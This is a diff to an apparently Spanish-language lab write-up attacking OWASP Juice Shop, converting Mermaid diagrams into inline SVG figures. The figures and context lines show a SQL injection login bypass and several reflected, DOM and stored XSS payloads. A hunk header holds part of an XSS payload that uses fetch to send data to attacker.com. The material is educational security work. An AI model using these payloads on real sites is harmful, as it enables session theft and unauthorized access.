@@ -409,17 +409,20 @@ WHERE email = '' OR 1=1 --'
 7. Ver respuesta con token JWT
 ```
 
-```mermaid
-flowchart LR
-    A[POST /rest/user/login] --> B[Content-Type: application/json]
-    B --> C["Body: {"email":"' OR 1=1--","password":"x"}"]
-    C --> D[Response 200 OK]
-    D --> E["{"authentication":{"token":"eyJ...","umail":"admin@juice-sh.op"}}"]
-    classDef req fill:#3b82f6,stroke:#1e40af,color:#fff
-    classDef resp fill:#10b981,stroke:#047857,color:#fff
-    class A,B,C req
-    class D,E resp
-```
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 4: Burp Suite — Request SQLi y respuesta con JWT de admin</div>
+<svg viewBox="0 0 600 120" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<rect x="10" y="10" width="110" height="45" rx="6" fill="#3b82f6"/><text x="65" y="30" text-anchor="middle" fill="white" font-size="11" font-weight="bold">POST</text><text x="65" y="45" text-anchor="middle" fill="#dbeafe" font-size="9">/rest/user/login</text>
+<polygon points="120,32 170,32 165,27 170,37" fill="#94a3b8"/>
+<rect x="170" y="10" width="110" height="45" rx="6" fill="#3b82f6"/><text x="225" y="27" text-anchor="middle" fill="white" font-size="10" font-weight="bold">Content-Type</text><text x="225" y="42" text-anchor="middle" fill="#dbeafe" font-size="9">application/json</text>
+<polygon points="280,32 320,32 315,27 320,37" fill="#94a3b8"/>
+<rect x="320" y="10" width="160" height="45" rx="6" fill="#3b82f6"/><text x="400" y="27" text-anchor="middle" fill="white" font-size="10" font-weight="bold">Body (SQLi Payload)</text><text x="400" y="42" text-anchor="middle" fill="#dbeafe" font-family="monospace" font-size="8">{"email":"' OR 1=1--"}</text>
+<polygon points="480,32 510,32 505,27 510,37" fill="#94a3b8"/>
+<rect x="10" y="70" width="110" height="40" rx="6" fill="#10b981"/><text x="65" y="87" text-anchor="middle" fill="white" font-size="11" font-weight="bold">200 OK</text><text x="65" y="100" text-anchor="middle" fill="#d1fae5" font-size="9">Response</text>
+<polygon points="120,90 170,90 165,85 170,95" fill="#94a3b8"/>
+<rect x="170" y="70" width="410" height="40" rx="6" fill="#10b981"/><text x="375" y="87" text-anchor="middle" fill="white" font-size="10" font-weight="bold">{"authentication":{"token":"eyJ...","umail":"admin@juice-sh.op"}}</text>
+</svg>
+</div>
 
 *Figura 4: Burp Suite — Request SQLi y respuesta con JWT de admin*
 
@@ -610,20 +613,23 @@ http://localhost:3000/search?q=<img src=x onerror=alert(1)>
 # Si aparece un alert → DOM XSS confirmado
 ```
 
-```mermaid
-flowchart TB
-    A[User Input: <iframe src="javascript:alert('xss')">] --> B[Angular Search Component]
-    B --> C{bypassSecurityTrustHtml()}
-    C -->|Sanitization DISABLED| D[Render in DOM]
-    D --> E[<iframe> executes JavaScript]
-    E --> F[alert('xss') popup]
-    classDef input fill:#ef4444,stroke:#b91c1c,color:#fff
-    classDef process fill:#f59e0b,stroke:#b45309,color:#fff
-    classDef output fill:#10b981,stroke:#047857,color:#fff
-    class A input
-    class B,C,D process
-    class E,F output
-```
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 5: DOM XSS — Flujo de sanitización desactivada en Angular</div>
+<svg viewBox="0 0 600 260" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">DOM XSS — Sanitization Bypass Flow</text>
+<rect x="150" y="35" width="300" height="35" rx="6" fill="#ef4444"/><text x="300" y="57" text-anchor="middle" fill="white" font-size="11" font-weight="bold">User Input: &lt;iframe src="javascript:alert('xss')"&gt;</text>
+<polygon points="300,70 300,90 295,85 305,85" fill="#94a3b8"/>
+<rect x="150" y="95" width="300" height="35" rx="6" fill="#f59e0b"/><text x="300" y="117" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Angular Search Component</text>
+<polygon points="300,130 300,150 295,145 305,145" fill="#94a3b8"/>
+<rect x="150" y="155" width="300" height="35" rx="6" fill="#f59e0b"/><text x="300" y="177" text-anchor="middle" fill="white" font-size="11" font-weight="bold">bypassSecurityTrustHtml() → DISABLED</text>
+<polygon points="300,190 300,210 295,205 305,205" fill="#94a3b8"/>
+<rect x="150" y="215" width="140" height="35" rx="6" fill="#f59e0b"/><text x="220" y="237" text-anchor="middle" fill="white" font-size="11">Render in DOM</text>
+<polygon points="290,232 330,232 325,227 330,237" fill="#94a3b8"/>
+<rect x="330" y="215" width="120" height="35" rx="6" fill="#10b981"/><text x="390" y="237" text-anchor="middle" fill="white" font-size="11">&lt;iframe&gt; executes</text>
+<polygon points="390,250 390,270 385,265 395,265" fill="#94a3b8"/>
+<rect x="270" y="275" width="240" height="35" rx="6" fill="#10b981"/><text x="390" y="297" text-anchor="middle" fill="white" font-size="11" font-weight="bold">alert('xss') popup ✓</text>
+</svg>
+</div>
 
 *Figura 5: DOM XSS — Flujo de sanitización desactivada en Angular*
 
@@ -683,19 +689,27 @@ http://localhost:3000/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.coo
 6. Verificar ejecución en el navegador
 ```
 
-```mermaid
-sequenceDiagram
-    participant U as User
-    participant B as Burp Proxy
-    participant S as Server
-    participant D as Browser DOM
-    U->>B: Search: <iframe src="javascript:alert(1)">
-    B->>S: GET /rest/products/search?q=<iframe...>
-    S-->>B: 200 OK (JSON response)
-    B-->>U: Forward response
-    U->>D: Angular renders unsanitized HTML
-    D-->>U: alert(1) executes
-```
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 6: Burp Suite — Interceptación de petición con payload XSS</div>
+<svg viewBox="0 0 600 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">Burp Suite — XSS Interception Sequence</text>
+<rect x="30" y="35" width="80" height="25" rx="4" fill="#ef4444"/><text x="70" y="52" text-anchor="middle" fill="white" font-size="10">User</text>
+<rect x="180" y="35" width="80" height="25" rx="4" fill="#f59e0b"/><text x="220" y="52" text-anchor="middle" fill="white" font-size="10">Burp Proxy</text>
+<rect x="350" y="35" width="80" height="25" rx="4" fill="#10b981"/><text x="390" y="52" text-anchor="middle" fill="white" font-size="10">Server</text>
+<rect x="500" y="35" width="80" height="25" rx="4" fill="#3b82f6"/><text x="540" y="52" text-anchor="middle" fill="white" font-size="10">Browser DOM</text>
+<line x1="70" y1="60" x2="70" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="220" y1="60" x2="220" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="390" y1="60" x2="390" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="540" y1="60" x2="540" y2="270" stroke="#64748b" stroke-width="1"/>
+<polygon points="70,85 220,85 215,80 220,90" fill="#94a3b8"/><text x="145" y="80" text-anchor="middle" fill="#e2e8f0" font-size="9">Search: &lt;iframe src="javascript:alert(1)"&gt;</text>
+<polygon points="220,110 390,110 385,105 390,115" fill="#94a3b8"/><text x="305" y="105" text-anchor="middle" fill="#e2e8f0" font-size="9">GET /rest/products/search?q=&lt;iframe...&gt;</text>
+<polygon points="390,135 220,135 225,130 220,140" fill="#94a3b8" stroke-dasharray="4,2"/><text x="305" y="130" text-anchor="middle" fill="#e2e8f0" font-size="9">200 OK (JSON response)</text>
+<polygon points="220,160 70,160 75,155 70,165" fill="#94a3b8" stroke-dasharray="4,2"/><text x="145" y="155" text-anchor="middle" fill="#e2e8f0" font-size="9">Forward response</text>
+<polygon points="70,185 540,185 535,180 540,190" fill="#94a3b8"/><text x="305" y="180" text-anchor="middle" fill="#e2e8f0" font-size="9">Angular renders unsanitized HTML</text>
+<polygon points="540,210 70,210 75,205 70,215" fill="#94a3b8" stroke-dasharray="4,2"/><text x="305" y="205" text-anchor="middle" fill="#e2e8f0" font-size="9">alert(1) executes in browser</text>
+<rect x="120" y="235" width="360" height="30" rx="6" fill="#7f1d1d" stroke="#ef4444"/><text x="300" y="255" text-anchor="middle" fill="#fca5a5" font-size="11">⚠ XSS executes in victim's browser context</text>
+</svg>
+</div>
 
 *Figura 6: Burp Suite — Interceptación de petición con payload XSS*
 
@@ -884,20 +898,25 @@ http://localhost:3000/search?q=<img src=x onerror="fetch('https://attacker.com/?
 6. Ejecuta el JavaScript → alert(1) se dispara
 ```
 
-```mermaid
-flowchart LR
-    A[Malicious URL] --> B[http://localhost:3000/#/track-result]
-    B --> C[?id=<iframe src="javascript:alert('xss')">]
-    C --> D[Server reflects 'id' in response]
-    D --> E[Browser renders unsanitized HTML]
-    E --> F[XSS executes]
-    classDef url fill:#ef4444,stroke:#b91c1c,color:#fff
-    classDef flow fill:#f59e0b,stroke:#b45309,color:#fff
-    classDef exec fill:#10b981,stroke:#047857,color:#fff
-    class A,B,C url
-    class D flow
-    class E,F exec
-```
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 7: Reflected XSS — URL maliciosa con payload en parámetro</div>
+<svg viewBox="0 0 600 140" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">Reflected XSS — Malicious URL Flow</text>
+<rect x="10" y="35" width="100" height="35" rx="6" fill="#ef4444"/><text x="60" y="57" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Malicious URL</text>
+<polygon points="110,52 140,52 135,47 140,57" fill="#94a3b8"/>
+<rect x="140" y="35" width="120" height="35" rx="6" fill="#ef4444"/><text x="200" y="50" text-anchor="middle" fill="white" font-size="9" font-weight="bold">localhost:3000/</text><text x="200" y="62" text-anchor="middle" fill="#fca5a5" font-size="9">#/track-result</text>
+<polygon points="260,52 290,52 285,47 290,57" fill="#94a3b8"/>
+<rect x="290" y="35" width="120" height="35" rx="6" fill="#ef4444"/><text x="350" y="50" text-anchor="middle" fill="white" font-size="9" font-weight="bold">?id=&lt;iframe</text><text x="350" y="62" text-anchor="middle" fill="#fca5a5" font-size="9">src="javascript:..."&gt;</text>
+<polygon points="410,52 440,52 435,47 440,57" fill="#94a3b8"/>
+<rect x="440" y="35" width="150" height="35" rx="6" fill="#f59e0b"/><text x="515" y="57" text-anchor="middle" fill="white" font-size="10">Server reflects 'id'</text>
+<polygon points="515,70 515,95 510,90 520,90" fill="#94a3b8"/>
+<rect x="440" y="100" width="150" height="35" rx="6" fill="#10b981"/><text x="515" y="122" text-anchor="middle" fill="white" font-size="10">Browser renders HTML</text>
+<polygon points="440,117 380,117 385,112 380,122" fill="#94a3b8"/>
+<rect x="260" y="100" width="120" height="35" rx="6" fill="#10b981"/><text x="320" y="122" text-anchor="middle" fill="white" font-size="11" font-weight="bold">XSS executes</text>
+<polygon points="260,117 200,117 205,112 200,122" fill="#94a3b8"/>
+<rect x="80" y="100" width="120" height="35" rx="6" fill="#10b981"/><text x="140" y="122" text-anchor="middle" fill="white" font-size="11">Payload delivered</text>
+</svg>
+</div>
 
 *Figura 7: Reflected XSS — URL maliciosa con payload en parámetro*
 
@@ -1948,19 +1967,27 @@ curl -X POST http://localhost:3000/api/Feedback \
 6. Visitar la página de feedback → script se ejecuta
 ```
 
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant API as /api/Feedback
-    participant DB as Database
-    participant Admin as Admin Panel
-    A->>API: POST {"comment":"<script>alert(1)</script>"}
-    API->>DB: INSERT INTO Feedback (no sanitization)
-    DB-->>API: 201 Created
-    Admin->>DB: SELECT * FROM Feedback
-    DB-->>Admin: Returns unsanitized comment
-    Admin-->>Admin: <script> executes in admin browser
-```
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 12: Stored XSS — Inyección via API y ejecución en panel admin</div>
+<svg viewBox="0 0 600 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">Stored XSS — API Injection Sequence</text>
+<rect x="20" y="35" width="90" height="25" rx="4" fill="#ef4444"/><text x="65" y="52" text-anchor="middle" fill="white" font-size="10">Attacker</text>
+<rect x="170" y="35" width="90" height="25" rx="4" fill="#f59e0b"/><text x="215" y="52" text-anchor="middle" fill="white" font-size="10">/api/Feedback</text>
+<rect x="340" y="35" width="90" height="25" rx="4" fill="#10b981"/><text x="385" y="52" text-anchor="middle" fill="white" font-size="10">Database</text>
+<rect x="490" y="35" width="90" height="25" rx="4" fill="#3b82f6"/><text x="535" y="52" text-anchor="middle" fill="white" font-size="10">Admin Panel</text>
+<line x1="65" y1="60" x2="65" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="215" y1="60" x2="215" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="385" y1="60" x2="385" y2="270" stroke="#64748b" stroke-width="1"/>
+<line x1="535" y1="60" x2="535" y2="270" stroke="#64748b" stroke-width="1"/>
+<polygon points="65,85 215,85 210,80 215,90" fill="#94a3b8"/><text x="140" y="80" text-anchor="middle" fill="#e2e8f0" font-size="9">POST {"comment":"&lt;script&gt;alert(1)&lt;/script&gt;"}</text>
+<polygon points="215,110 385,110 380,105 385,115" fill="#94a3b8"/><text x="300" y="105" text-anchor="middle" fill="#e2e8f0" font-size="9">INSERT INTO Feedback (no sanitization)</text>
+<polygon points="385,135 215,135 220,130 215,140" fill="#94a3b8" stroke-dasharray="4,2"/><text x="300" y="130" text-anchor="middle" fill="#e2e8f0" font-size="9">201 Created</text>
+<rect x="140" y="155" width="320" height="30" rx="6" fill="#7f1d1d" stroke="#ef4444"/><text x="300" y="175" text-anchor="middle" fill="#fca5a5" font-size="11">⚠ Malicious payload stored in database</text>
+<polygon points="535,205 385,205 390,200 385,210" fill="#94a3b8"/><text x="460" y="200" text-anchor="middle" fill="#e2e8f0" font-size="9">SELECT * FROM Feedback</text>
+<polygon points="385,230 535,230 530,225 535,235" fill="#94a3b8" stroke-dasharray="4,2"/><text x="460" y="225" text-anchor="middle" fill="#e2e8f0" font-size="9">Returns unsanitized comment</text>
+<rect x="460" y="250" width="150" height="25" rx="4" fill="#ef4444"/><text x="535" y="267" text-anchor="middle" fill="white" font-size="10">&lt;script&gt; executes!</text>
+</svg>
+</div>
 
 *Figura 12: Stored XSS — Inyección via API y ejecución en panel admin*
 
